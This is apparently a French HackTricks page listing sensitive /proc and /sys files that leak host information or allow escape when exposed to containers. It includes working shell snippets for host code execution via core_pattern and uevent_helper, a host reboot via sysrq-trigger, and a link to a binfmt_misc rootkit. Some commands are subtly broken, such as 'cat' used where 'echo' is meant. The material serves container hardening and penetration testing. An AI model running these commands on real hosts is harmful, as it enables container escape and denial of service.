En raison du manque de prise en charge de l'espace de noms, l'exposition de `/proc` et `/sys` offre une source de surface d'attaque et de divulgation d'informations significative. De nombreux fichiers dans `procfs` et `sysfs` offrent un risque d'évasion de conteneur, de modification de l'hôte ou de divulgation d'informations de base qui pourraient faciliter d'autres attaques.

Pour exploiter ces techniques, il pourrait suffire de **mal configurer quelque chose comme `-v /proc:/host/proc`** car AppArmor ne protège pas `/host/proc` car **AppArmor est basé sur le chemin d'accès**.

# procfs

## /proc/sys

`/proc/sys` permet généralement d'accéder à la modification des variables du noyau, souvent contrôlées via `sysctl(2)`.

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html) définit un programme qui est exécuté lors de la génération de fichiers de base (généralement un plantage de programme) et reçoit le fichier de base en entrée standard si le premier caractère de ce fichier est un symbole de tuyau `|`. Ce programme est exécuté par l'utilisateur root et permettra jusqu'à 128 octets d'arguments de ligne de commande. Cela permettrait une exécution de code trivial dans l'hôte de conteneur donné n'importe quel plantage et génération de fichier de base (qui peut être simplement jeté pendant une myriade d'actions malveillantes).
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) contient le chemin d'accès au chargeur de module du noyau, qui est appelé lors du chargement d'un module du noyau tel que via la commande [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html). L'exécution de code peut être obtenue en effectuant toute action qui déclenchera le noyau pour tenter de charger un module du noyau (comme l'utilisation de l'API de cryptographie pour charger un module de cryptographie actuellement non chargé, ou l'utilisation de ifconfig pour charger un module de réseau pour un périphérique actuellement non utilisé).
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html) est un indicateur global qui détermine si le noyau doit paniquer lorsqu'une condition de mémoire insuffisante (OOM) est atteinte (plutôt que d'invoquer l'OOM killer). Cela relève davantage d'une attaque de déni de service (DoS) que d'une évasion de conteneur, mais cela expose néanmoins une capacité qui ne devrait être disponible que pour l'hôte.

### /proc/sys/fs

Le répertoire [/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) contient un ensemble d'options et d'informations concernant divers aspects du système de fichiers, notamment les quotas, les poignées de fichiers, les inodes et les informations d'entrée de répertoire. L'accès en écriture à ce répertoire permettrait diverses attaques de déni de service contre l'hôte.

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html) permet d'exécuter des formats binaires divers, ce qui signifie généralement que divers interprètes peuvent être enregistrés pour des formats binaires non natifs (tels que Java) en fonction de leur numéro magique. Vous pouvez faire exécuter un binaire par le noyau en l'enregistrant comme gestionnaire.\
Vous pouvez trouver une exploitation dans [https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc) : _Poor man's rootkit, leverage_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst) _option de_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _pour escalader les privilèges via n'importe quel binaire suid (et obtenir un shell root) si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture._

Pour une explication plus détaillée de cette technique, consultez [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) en fonction des paramètres `CONFIG_IKCONFIG_PROC`, cela expose une version compressée des options de configuration du noyau pour le noyau en cours d'exécution. Cela peut permettre à un conteneur compromis ou malveillant de découvrir et de cibler facilement des zones vulnérables activées dans le noyau.

## /proc/sysrq-trigger

`Sysrq` est un ancien mécanisme qui peut être invoqué via une combinaison spéciale de touches `SysRq`. Cela peut permettre un redémarrage immédiat du système, l'émission de `sync(2)`, le remontage de tous les systèmes de fichiers en lecture seule, l'invocation de débogueurs de noyau et d'autres opérations.

Si l'invité n'est pas correctement isolé, il peut déclencher les commandes [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) en écrivant des caractères dans le fichier `/proc/sysrq-trigger`.
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) peut exposer les messages du tampon circulaire du noyau généralement accessibles via `dmesg`. L'exposition de ces informations peut aider à exploiter le noyau, déclencher des fuites d'adresses du noyau (qui pourraient être utilisées pour aider à vaincre la randomisation de l'espace d'adressage du noyau (KASLR)) et être une source de divulgation d'informations générales sur le noyau, le matériel, les paquets bloqués et autres détails du système.

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) contient une liste de symboles exportés du noyau et de leurs emplacements d'adresse pour les modules dynamiques et chargeables. Cela inclut également l'emplacement de l'image du noyau en mémoire physique, ce qui est utile pour le développement d'exploits du noyau. À partir de ces emplacements, l'adresse de base ou le décalage du noyau peut être localisé, ce qui peut être utilisé pour vaincre la randomisation de l'espace d'adressage du noyau (KASLR).

Pour les systèmes avec `kptr_restrict` défini sur `1` ou `2`, ce fichier existera mais ne fournira aucune information d'adresse (bien que l'ordre dans lequel les symboles sont répertoriés soit identique à l'ordre en mémoire).

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) expose des interfaces au périphérique de mémoire du noyau `/dev/mem`. Bien que l'espace de noms PID puisse protéger contre certaines attaques via ce vecteur `procfs`, cette zone a historiquement été vulnérable, puis considérée comme sûre et à nouveau trouvée [vulnérable](https://git.zx2c4.com/CVE-2012-0056/about/) pour l'escalade de privilèges.

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) représente la mémoire physique du système et est dans un format de noyau ELF (typiquement trouvé dans les fichiers de vidage de noyau). Il n'autorise pas l'écriture dans ladite mémoire. La capacité de lire ce fichier (restreint aux utilisateurs privilégiés) peut divulguer le contenu de la mémoire du système hôte et d'autres conteneurs.

La taille de fichier signalée représente la quantité maximale de mémoire physiquement adressable pour l'architecture, et peut causer des problèmes lors de sa lecture (ou des plantages en fonction de la fragilité du logiciel).

[Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` est une interface alternative pour [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html) (l'accès direct à celui-ci est bloqué par la liste blanche du périphérique cgroup), qui est un fichier de périphérique de caractères représentant la mémoire virtuelle du noyau. Il permet à la fois la lecture et l'écriture, permettant la modification directe de la mémoire du noyau.

## /proc/mem

`/proc/mem` est une interface alternative pour [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html) (l'accès direct à celui-ci est bloqué par la liste blanche du périphérique cgroup), qui est un fichier de périphérique de caractères représentant la mémoire physique du système. Il permet à la fois la lecture et l'écriture, permettant la modification de toute la mémoire. (Il nécessite légèrement plus de finesse que `kmem`, car les adresses virtuelles doivent d'abord être résolues en adresses physiques).

## /proc/sched\_debug

`/proc/sched_debug` est un fichier spécial qui renvoie des informations de planification de processus pour l'ensemble du système. Ces informations comprennent les noms de processus et les identifiants de processus de tous les espaces de noms en plus des identificateurs de cgroup de processus. Cela contourne efficacement les protections de l'espace de noms PID et peut être exploité dans des conteneurs non privilégiés également.

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) contient des informations sur les points de montage dans l'espace de noms de montage du processus. Il expose l'emplacement de `rootfs` ou de l'image du conteneur.

# sysfs

## /sys/kernel/uevent\_helper

Les `uevents` sont des événements déclenchés par le noyau lorsqu'un périphérique est ajouté ou supprimé. Notamment, le chemin pour le `uevent_helper` peut être modifié en écrivant dans `/sys/kernel/uevent_helper`. Ensuite, lorsqu'un `uevent` est déclenché (ce qui peut également être fait depuis l'espace utilisateur en écrivant dans des fichiers tels que `/sys/class/mem/null/uevent`), le `uevent_helper` malveillant est exécuté.
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

Accès à ACPI et divers paramètres matériels pour le contrôle de la température, généralement trouvés dans les ordinateurs portables ou les cartes mères de jeux. Cela peut permettre des attaques DoS contre l'hôte du conteneur, ce qui peut même entraîner des dommages physiques.

## /sys/kernel/vmcoreinfo

Ce fichier peut divulguer des adresses de noyau qui pourraient être utilisées pour vaincre KASLR.

## /sys/kernel/security

Dans `/sys/kernel/security` est montée l'interface `securityfs`, qui permet la configuration des modules de sécurité Linux. Cela permet la configuration des politiques [AppArmor](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor), et donc l'accès à cela peut permettre à un conteneur de désactiver son système MAC.

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars` expose des interfaces pour interagir avec les variables EFI dans la NVRAM. Bien que cela ne soit pas généralement pertinent pour la plupart des serveurs, EFI devient de plus en plus populaire. Des faiblesses de permission ont même conduit à certains ordinateurs portables bloqués.

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars` fournit une interface pour écrire dans la NVRAM utilisée pour les arguments de démarrage UEFI. Les modifier peut rendre la machine hôte incapable de démarrer.

## /sys/kernel/debug

`debugfs` fournit une interface "sans règles" par laquelle le noyau (ou les modules de noyau) peuvent créer des interfaces de débogage accessibles à l'espace utilisateur. Il a eu un certain nombre de problèmes de sécurité dans le passé, et les directives "sans règles" derrière le système de fichiers ont souvent été en conflit avec les contraintes de sécurité.

# Références

* [Comprendre et renforcer les conteneurs Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abus des conteneurs Linux privilégiés et non privilégiés](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
